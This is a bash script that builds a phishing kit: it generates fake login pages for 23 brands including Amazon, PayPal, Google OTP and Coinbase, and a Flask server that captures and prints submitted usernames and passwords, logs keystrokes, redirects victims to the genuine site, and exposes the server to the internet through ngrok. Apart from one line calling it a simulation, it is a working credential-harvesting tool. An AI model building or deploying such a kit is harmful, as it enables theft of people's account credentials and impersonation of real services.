#!/bin/bash

# Run the environment setup script
./setup_environment.sh

# Function to display menu and get user input
get_user_selection() {
    echo "$1"
    shift
    local options=("$@")
    for i in "${!options[@]}"; do
        echo "$((i + 1)). ${options[i]}"
    done
    read -p "Select an option [1-${#options[@]}]: " selection
    echo $((selection - 1))
}

# Menu for selecting phishing site
site_options=("Amazon" "Cryptocurrency" "Ebay" "Facebook" "Github" "Google OTP" "Instagram" "LinkedIn" "Netflix" "Paypal" "Phonepay" "Pinterest" "Protonmail" "Snapchat" "Spotify" "StackOverflow" "Telegram" "TikTok" "Twitch" "Twitter" "UberEats" "WhatsApp" "Wordpress")
site_selection=$(get_user_selection "Select the phishing site to set up:" "${site_options[@]}")

# Menu for selecting proxy method
proxy_options=("Ngrok" "Serve")
proxy_selection=$(get_user_selection "Select the proxy method:" "${proxy_options[@]}")

# Create directory structure for the selected site
selected_site="${site_options[$site_selection],,}"
mkdir -p "phishing_sites/$selected_site"

# Create basic HTML content for the selected site
cat <<EOT > "phishing_sites/$selected_site/index.html"
<!doctype html>
<html>
    <head>
        <title>${site_options[$site_selection]} Login</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f5f5f5; }
            .login-container { width: 300px; margin: 100px auto; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); }
            h1 { text-align: center; color: #333; }
            form { display: flex; flex-direction: column; }
            label, input { margin-bottom: 10px; }
            input[type="submit"] { background: #007bff; color: #fff; border: none; padding: 10px; border-radius: 4px; cursor: pointer; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h1>${site_options[$site_selection]} Login</h1>
            <form action="/submit_$selected_site" method="post">
                <label for="username">Username:</label><br>
                <input type="text" id="username" name="username"><br>
                <label for="password">Password:</label><br>
                <input type="password" id="password" name="password"><br><br>
                <input type="submit" value="Submit">
            </form>
        </div>
    </body>
</html>
EOT

# Create Flask app for handling submissions
cat <<EOT > app.py
from flask import Flask, request, redirect, render_template_string
import os

app = Flask(__name__)

# Directory containing phishing sites
PHISHING_SITES_DIR = 'phishing_sites'

# Mapping of sites to their real URLs
sites = {
    "amazon": "https://www.amazon.com",
    "cryptocurrency": "https://www.coinbase.com",
    "ebay": "https://www.ebay.com",
    "facebook": "https://www.facebook.com",
    "github": "https://www.github.com",
    "google_otp": "https://accounts.google.com",
    "instagram": "https://www.instagram.com",
    "linkedin": "https://www.linkedin.com",
    "netflix": "https://www.netflix.com",
    "paypal": "https://www.paypal.com",
    "phonepay": "https://www.phonepe.com",
    "pinterest": "https://www.pinterest.com",
    "protonmail": "https://mail.protonmail.com",
    "snapchat": "https://www.snapchat.com",
    "spotify": "https://www.spotify.com",
    "stackoverflow": "https://stackoverflow.com",
    "telegram": "https://web.telegram.org",
    "tiktok": "https://www.tiktok.com",
    "twitch": "https://www.twitch.tv",
    "twitter": "https://www.twitter.com",
    "ubereats": "https://www.ubereats.com",
    "whatsapp": "https://web.whatsapp.com",
    "wordpress": "https://www.wordpress.com"
}

@app.route('/')
def index():
    return "Phishing simulation server is running."

# Dynamic route for each site
@app.route('/<site>', methods=['GET'])
def serve_site(site):
    if os.path.exists(f"{PHISHING_SITES_DIR}/{site}/index.html"):
        with open(f"{PHISHING_SITES_DIR}/{site}/index.html", 'r') as file:
            return render_template_string(file.read())
    else:
        return "Site not found.", 404

# Dynamic route for handling form submissions
@app.route('/submit_<site>', methods=['POST'])
def handle_submit(site):
    username = request.form['username']
    password = request.form['password']
    # Log captured credentials to the console (or store securely in a real scenario)
    print(f"Captured credentials for {site}: Username: {username}, Password: {password}")
    # Redirect to the real site after capturing credentials
    if site in sites:
        return redirect(sites[site])
    else:
        return "Site not found.", 404

# Endpoint to log keystrokes
@app.route('/log_key', methods=['POST'])
def log_key():
    key = request.json.get('key')
    print(f"Captured key: {key}")
    return '', 204

if __name__ == '__main__':
    app.run(debug=True)
EOT

# Starting the Flask app
echo "Starting the Flask app..."
python3 app.py &

# Wait for Flask app to start
sleep 5

# Setting up the selected proxy
if [ "$proxy_selection" -eq 0 ]; then
    echo "Setting up Ngrok..."
    ngrok http 5000
elif [ "$proxy_selection" -eq 1 ]; then
    echo "Setting up Serve..."
    serve -s build
else
    echo "Invalid selection"
fi